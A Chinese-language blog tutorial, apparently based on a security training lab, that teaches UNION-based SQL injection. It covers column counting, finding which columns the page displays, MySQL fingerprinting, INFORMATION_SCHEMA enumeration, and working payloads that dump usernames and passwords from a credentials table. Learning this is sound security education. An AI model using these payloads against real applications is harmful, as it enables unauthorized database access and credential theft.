+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> products <span class="keyword">where</span> product_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password <span class="keyword">from</span> passwords<span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>假设“products”表有两列，上面的查询将返回“password”表中的“username”和“password”条目。</p>
+<h2 id="Un-even-Columns"><a href="#Un-even-Columns" class="headerlink" title="Un-even Columns"></a>Un-even Columns</h2><p>​	我们将发现，原始查询的列数通常与我们想要执行的SQL查询的列数不同，因此我们必须解决这个问题。例如，假设我们只有一列。</p>
+<p>​	在这种情况下，我们想要SELECT，我们可以为剩余的必需列放置垃圾数据，以便我们要联合的列总数与原始查询保持相同。例如，我们可以使用任何字符串作为垃圾数据，查询将返回该字符串作为该列的输出。</p>
+<p>​	如果我们使用字符串“junk”进行UNION, SELECT查询将从密码中SELECT“junk”，这将始终返回垃圾。</p>
+<p>​	我们也可以用数字。例如，对密码的查询SELECT 1将始终返回1作为输出。</p>
+<p>​	注意:当用垃圾数据填充其他列时，必须确保数据类型与列的数据类型匹配，否则查询将返回错误。为了简单起见，我们将使用数字作为垃圾数据，这对于跟踪有效载荷位置也很方便，我们将在后面讨论。</p>
+<p>​	提示:对于高级SQL注入，我们可能希望简单地使用’NULL’填充其他列，因为’NULL’适合所有数据类型。</p>
+<p>​	在上面的示例中，products表有两列，因此我们必须使用两列进行UNION。如果我们只想获得一列，例如username，我们必须执行username, 2，这样我们就有相同数量的列:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> products <span class="keyword">where</span> product_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, <span class="number">2</span> <span class="keyword">from</span> passwords</span><br></pre></td></tr></table></figure>
+
+<p>​	如果在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果最初的查询在一个有四列的表上使用了SELECT，那么我们的UNION注入将是:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> passwords<span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这个查询将返回:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- &#x27;</span><br><span class="line"></span><br><span class="line">+-----------+-----------+-----------+-----------+</span><br><span class="line">| product_1 | product_2 | product_3 | product_4 |</span><br><span class="line">+-----------+-----------+-----------+-----------+</span><br><span class="line">|   admin   |    2      |    3      |    4      |</span><br><span class="line">+-----------+-----------+-----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>正如我们所看到的，我们想要的“UNION SELECT username from passwords”查询的输出位于第二行的第一列，而数字则填充在其余列中。</p>
+<h1 id="Union-Injection"><a href="#Union-Injection" class="headerlink" title="Union Injection"></a>Union Injection</h1><p>我们在搜索参数中看到潜在的SQL注入。我们通过注入一个单引号(‘)来应用SQLi Discovery步骤，我们确实得到了一个错误:</p>
+<p>由于我们导致了一个错误，这可能意味着该页面容易受到SQL注入的攻击。这个场景非常适合通过基于union的注入进行利用，因为我们可以看到查询的结果。</p>
+<h2 id="检测列数"><a href="#检测列数" class="headerlink" title="检测列数"></a>检测列数</h2><p>在继续使用基于union的查询之前，我们需要找到服务器选择的列的数量。有两种检测列数的方法:</p>
+<ul>
+<li>Using <code>ORDER BY</code></li>
+<li>Using <code>UNION</code></li>
+</ul>
+<p>​	检测列数的第一种方法是通过ORDER BY函数，我们在前面讨论过。我们必须注入一个查询，该查询按照我们指定的列(即列1、列2，等等)对结果进行排序，直到我们得到一个错误，指出指定的列不存在。例如，我们可以从按1排序开始，按第一列排序，并且成功，因为表必须至少有一列。</p>
+<p>​	然后我们将按2排序，然后按3排序，直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着该列号不存在。</p>
+<p>​	我们成功排序的最后一个成功列给出了列的总数。如果按4排序失败，这意味着表有三列，这是我们能够成功排序的列数。让我们回到前面的例子并尝试相同的方法，使用以下有效负载:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; order by 1-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>提醒:我们在末尾添加了一个额外的破折号(-)，以表明(——)后面有一个空格。</p>
+<p>如我们所见，我们得到了一个正常的结果:</p>
+<p>我们对第3列和第4列做同样的处理，得到结果。然而，当我们尝试ORDER BY第5列时，我们得到以下错误:</p>
+<p>这意味着这个表恰好有4列。</p>
+<p>另一种方法是尝试使用不同数量的列进行Union注入，直到成功返回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出一个错误，直到我们获得成功。我们可以从注入一个3列的UNION查询开始:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,2,3-- -</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="注射位置"><a href="#注射位置" class="headerlink" title="注射位置"></a>注射位置</h2><p>​	虽然查询可能返回多个列，但 Web 应用程序可能只显示其中的一些列。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面上，以确定在何处放置注入。</p>
+<p>​	在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们只看到 2、3 和 4 作为输出数据显示在页面上：</p>
+<p>​	并非每一列都会显示给用户，这是很常见的。例如，ID字段经常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列，以便将我们的注入放入其中的任何一个中。我们不能在开始时输入注射,或者它的输出不会打印出来。</p>
+<p>​	这是使用数字作为垃圾数据的好处，因为它可以轻松跟踪打印了哪些列，因此我们知道在哪一列中放置查询。为了测试我们是否可以从数据库中获取实际数据“而不仅仅是数字”，我们可以使用 SQL<code>@@version</code>查询作为测试，并将其放在第二列而不是数字 2 中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x27; UNION select 1,@@version,3,4-- -</span><br></pre></td></tr></table></figure>
+
+<h1 id="数据库枚举"><a href="#数据库枚举" class="headerlink" title="数据库枚举"></a>数据库枚举</h1><h2 id="MySQL-指纹识别"><a href="#MySQL-指纹识别" class="headerlink" title="MySQL 指纹识别"></a>MySQL 指纹识别</h2><p>​	在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 的类型。这是因为每个 DBMS 都有不同的查询，了解它是什么将帮助我们知道要使用哪些查询。</p>
+<p>​	作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是<code>Apache</code>或<code>Nginx</code>，则可以很好地猜测该 Web 服务器在 Linux 上运行，因此 DBMS 很可能是<code>MySQL</code>。</p>
+<p>​	如果网络服务器是的话，这同样适用于 Microsoft DBMS <code>IIS</code>，所以很可能是这样<code>MSSQL</code>。然而，这是一个牵强的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。</p>
+<p>​	因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。</p>
+<p>​	正如我们<code>MySQL</code>在本模块中介绍的那样，让我们对<code>MySQL</code>数据库进行指纹识别。以下查询及其输出将告诉我们正在处理<code>MySQL</code>：</p>
+<table>
+<thead>
+<tr>
+<th>有效载荷</th>
+<th>何时使用</th>
+<th>预期输出</th>
+<th>输出错误</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT @@version</code></td>
+<td>当我们有完整的查询输出时</td>
+<td>MySQL 版本“ie <code>10.3.22-MariaDB-1ubuntu1</code>”</td>
+<td>在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。</td>
+</tr>
+<tr>
+<td><code>SELECT POW(1,1)</code></td>
+<td>当我们只有数字输出时</td>
+<td><code>1</code></td>
+<td>其他 DBMS 错误</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>盲&#x2F;无输出</td>
+<td>延迟页面响应 5 秒并返回<code>0</code>。</td>
+<td>不会延迟与其他 DBMS 的响应</td>
+</tr>
+</tbody></table>
+<p>​	正如我们在上一节的示例中看到的，当我们尝试时<code>@@version</code>，它给了我们：</p>
+<p>​	输出<code>10.3.22-MariaDB-1ubuntu1</code>意味着我们正在处理<code>MariaDB</code>类似于 MySQL 的 DBMS。由于我们有直接查询输出，因此我们不必测试其他有效负载。相反，我们可以测试它们并看看我们会得到什么。</p>
+<h2 id="INFORMATION-SCHEMA-数据库"><a href="#INFORMATION-SCHEMA-数据库" class="headerlink" title="INFORMATION_SCHEMA 数据库"></a>INFORMATION_SCHEMA 数据库</h2><p>要使用从表中提取数据<code>UNION SELECT</code>，我们需要正确地构建<code>SELECT</code>查询。为此，我们需要以下信息：</p>
+<ul>
+<li>数据库列表</li>
+<li>每个数据库中的表列表</li>
+<li>每个表中的列列表</li>
+</ul>
+<p>有了上述信息，我们就可以形成<code>SELECT</code>语句来转储 DBMS 内任何数据库中任何表中任何列的数据。这是我们可以利用<code>INFORMATION_SCHEMA</code>数据库的地方。</p>
+<p>INFORMATION_SCHEMA数据库包含有关服务器上存在<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html">的</a>数据库和表的元数据。该数据库在利用 SQL 注入漏洞时发挥着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表<code>SELECT</code>。如果我们只为语句指定表的名称<code>SELECT</code>，它将在同一数据库中查找表。</p>
+<p>因此，要引用另一个数据库中存在的表，我们可以使用点“ ”<code>.</code>运算符。例如，对于名为 的数据库中存在的<code>SELECT</code>表，我们可以使用：<code>users``my_database</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM my_database.users;</span><br></pre></td></tr></table></figure>
+
+<p>样，我们可以查看<code>INFORMATION_SCHEMA</code>数据库中存在的表。</p>
+<h2 id="图式"><a href="#图式" class="headerlink" title="图式"></a>图式</h2><p>为了开始我们的枚举，我们应该找到 DBMS 上有哪些数据库可用。数据库中的表<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html">SCHEMATA</a><code>INFORMATION_SCHEMA</code>包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该<code>SCHEMA_NAME</code>列包含当前存在的所有数据库名称。</p>
+<p>让我们首先在本地数据库上测试一下，看看查询是如何使用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| SCHEMA_NAME        |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql              |</span><br><span class="line">| information_schema |</span><br><span class="line">| performance_schema |</span><br><span class="line">| ilfreight          |</span><br><span class="line">| dev                |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们看到<code>ilfreight</code>和<code>dev</code>数据库。</p>
+<p>注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在 DB 枚举时忽略它们。有时还有第四个“sys”数据库。</p>
+<p>现在，让我们使用<code>UNION</code>SQL 注入执行相同的操作，负载如下：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>除了默认数据库之外，我们再次看到两个数据库<code>ilfreight</code>和。<code>dev</code>让我们找出 Web 应用程序正在运行哪个数据库来检索端口数据。我们可以通过查询找到当前的数据库<code>SELECT database()</code>。我们可以像上一节中查找 DBMS 版本的方式类似地执行此操作：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,database(),2,3-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>我们看到数据库名称是<code>ilfreight</code>。然而，另一个数据库 ( <code>dev</code>) 看起来很有趣。那么，让我们尝试从中检索表。</p>
+<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>在从数据库转储数据之前<code>dev</code>，我们需要获取表的列表，以便使用<code>SELECT</code>语句查询它们。要查找数据库中的所有表，我们可以使用数据库<code>TABLES</code>中的表<code>INFORMATION_SCHEMA</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html">TABLES</a>表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>列感兴趣。该<code>TABLE_NAME</code>列存储表名，而该<code>TABLE_SCHEMA</code>列则指向每个表所属的数据库。这可以类似于我们查找数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找<code>dev</code>数据库中的表：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#x27;</span>dev<span class="string">&#x27;-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>请注意我们如何将数字“2”和“3”替换为“TABLE_NAME”和“TABLE_SCHEMA”，以获取同一查询中两列的输出。</p>
+<h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><p>要转储表的数据<code>credentials</code>，我们首先需要找到表中的列名，这些列名可以在数据库<code>COLUMNS</code>的表中找到<code>INFORMATION_SCHEMA</code>。COLUMNS表包含有关所有数据库中存在的所有列的信息<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html">。</a>这有助于我们找到要查询表的列名。、<code>COLUMN_NAME</code>、<code>TABLE_NAME</code>和<code>TABLE_SCHEMA</code>列可用于实现此目的。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名称<code>credentials</code>：</p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#x27;</span>credentials<span class="string">&#x27;-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>该表有两列，名为<code>username</code>和<code>password</code>。我们可以使用此信息并从表中转储数据。</p>
+<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>现在我们已经有了所有信息，我们可以形成查询来转储数据库表中和列<code>UNION</code>的数据。我们可以用和来代替第 2 列和第 3 列：<code>username``password``credentials``dev``username``password</code></p>
+<p>代码：sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1, username, password, 4 from dev.credentials-- -</span></span><br></pre></td></tr></table></figure>
+
+<p>请记住：不要忘记使用点运算符来引用“dev”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。</p>
+<p>我们能够获取表中的所有条目<code>credentials</code>，其中包含密码哈希值和 API 密钥等敏感信息。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2023 answer77
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>Help us with donation</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 672px;
+    }
+    .nav.fullscreen {
+        margin-left: -672px;
+    }
+    .nav-left {
+        width: 250px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 572px;
+        }
+        .nav.fullscreen {
+            margin-left: -572px;
+        }
+        .nav-left {
+            width: 180px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 572px;
+            margin-left: -572px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/3.png);
+    }
+    
+    
+    #post .index {
+        background: url(/img/3.png);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/2.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
